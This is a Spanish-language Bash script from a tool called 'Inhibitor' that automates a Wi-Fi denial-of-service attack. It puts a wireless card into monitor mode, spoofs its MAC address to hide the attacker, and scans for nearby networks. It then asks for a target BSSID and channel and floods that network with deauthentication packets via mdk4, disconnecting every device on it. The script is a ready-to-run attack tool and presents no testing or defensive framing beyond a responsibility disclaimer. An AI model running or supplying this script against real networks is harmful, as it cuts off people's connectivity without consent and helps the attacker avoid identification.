#!bin/bash

clear
echo
echo "                           _____           _       _   _       _   _                  "
echo "                          |_   _|         | |     (_) | |     (_) | |                 "
echo "                            | |    _ __   | |__    _  | |__    _  | |_    ___    _ __ "
echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  / _ \  | '__|"
echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
echo "                              __________________________________________________"					
echo "                                ︻デ═一  Created by: XDeadHackerX v1.3  ︻デ═一 " 
echo "          -------------------------------------------------------------------------------------------"
echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
echo "          -------------------------------------------------------------------------------------------"
echo
echo
echo "[7] Desconectar a todos los dispositivos de una Red Wifi"
echo 
sudo airmon-ng
echo
read -p "[*] Escribe la Interfaz de la Tarjeta de Red (Ej: wlan0): " interfaz
read -p "[*] Cortar la salida a internet para evitar futuros errores? (y/n): " opc2
echo
if [ $opc2 = y ]
	then
		sudo airmon-ng check kill >/dev/null
	else
echo "OK"
fi
sudo ifconfig $interfaz promisc >/dev/null
echo "======================="
echo "Activando Modo Monitor"
echo "======================="
echo "--->""                  |"
sleep 1
echo "-------->""             |"
sleep 1
echo "--------------->""      |"
sleep 1
echo "--------------------->""|"
echo "======================="
sudo airmon-ng start $interfaz
echo
read -p "[*] Escribe la Interfaz de la Tarjeta de Red en modo Monitor (Ej: wlan0mon o wlan0): " interfaz2
echo
sudo ifconfig $interfaz2 promisc >/dev/null
sudo ifconfig $interfaz2 down >/dev/null
sudo macchanger -a $interfaz2 >/dev/null
sudo ifconfig $interfaz2 up >/dev/null
echo "======================="
echo " Activando Modo Seguro"
echo "======================="
echo "--->""                  |"
sleep 1
echo "-------->""             |"
sleep 1
echo "--------------->""      |"
sleep 1
echo "--------------------->""|"
echo "======================="
clear
echo
echo "                           _____           _       _   _       _   _                  "
echo "                          |_   _|         | |     (_) | |     (_) | |                 "
echo "                            | |    _ __   | |__    _  | |__    _  | |_    ___    _ __ "
echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  / _ \  | '__|"
echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
echo "                              __________________________________________________"					
echo "                                ︻デ═一  Created by: XDeadHackerX v1.3  ︻デ═一 " 
echo "          -------------------------------------------------------------------------------------------"
echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
echo "          -------------------------------------------------------------------------------------------"
echo
echo
echo "[#] Pulse Ctrl + c (Cuando aparezca por pantalla el Wifi objetivo, puede tardar hasta 1 minuto)"
echo
sudo wash -2 -5 -a -i $interfaz2
read -p "[*] Copia el BSSID del Wifi Objetivo y pegelo a continuacion: " bssid
read -p "[*] Copia el Canal (Ch) del Wifi Objetivo y pegelo a continuacion: " ch
clear
echo
echo "                           _____           _       _   _       _   _                  "
echo "                          |_   _|         | |     (_) | |     (_) | |                 "
echo "                            | |    _ __   | |__    _  | |__    _  | |_    ___    _ __ "
echo "                            | |   | '_ \  | '_ \  | | | '_ \  | | | __|  / _ \  | '__|"
echo "                           _| |_  | | | | | | | | | | | |_) | | | | |_  | (_) | | |   "
echo "                          |_____| |_| |_| |_| |_| |_| |_.__/  |_|  \__|  \___/  |_|   " 
echo "                              __________________________________________________"					
echo "                                ︻デ═一  Created by: XDeadHackerX v1.3  ︻デ═一 " 
echo "          -------------------------------------------------------------------------------------------"
echo "          Cualquier acción y o actividad relacionada con Inhibitor es únicamente su responsabilidad"
echo "          -------------------------------------------------------------------------------------------"
echo
echo
echo "[#] Pulse Ctrl + c (Para finalizar el Ataque y Todos los usuarios se reconecten al Wifi)"
echo
echo
echo "========================================================================================="
echo "                      El Objetivo ($bssid) esta siendo Atacado"
echo "========================================================================================="
echo
sudo gnome-terminal -- sudo airodump-ng -c $ch --bssid $bssid $interfaz2 --band abg
sleep 2
sudo mdk4 $interfaz2 d -B $bssid -c $ch
echo
echo
sleep 1
echo
echo "[#] Desactivando Ataque y Protocolos"
echo
sudo ifconfig $interfaz2 down >/dev/null
sudo macchanger -p $interfaz2 >/dev/null
sudo ifconfig $interfaz2 up >/dev/null
sudo ifconfig $interfaz2 -promisc >/dev/null
sudo airmon-ng stop $interfaz2 >/dev/null
sudo ifconfig $interfaz -promisc >/dev/null
sudo systemctl restart NetworkManager.service >/dev/null
echo "=============================="
echo "        Desactivando"
echo "Ataque/Modo Monitor/Seguridad"
echo "=============================="
echo "-------->""                    |"
sleep 1
echo "--------------->""             |"
sleep 1
echo "---------------------->""      |"
sleep 1
echo "---------------------------->""|"
echo "=============================="
echo
echo
echo "#####################"
echo "[1] Volver al Menu"
echo "[2] Volver a ejecutar"
echo "[3] Salir"
echo "#####################"
echo
read -p "Elige una opcion: " opc3
	case $opc3 in
			1 )	bash inhibitor.sh
				;;
			2 )	bash requisitos/7.sh
				;;
			3 )	exit && clear
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
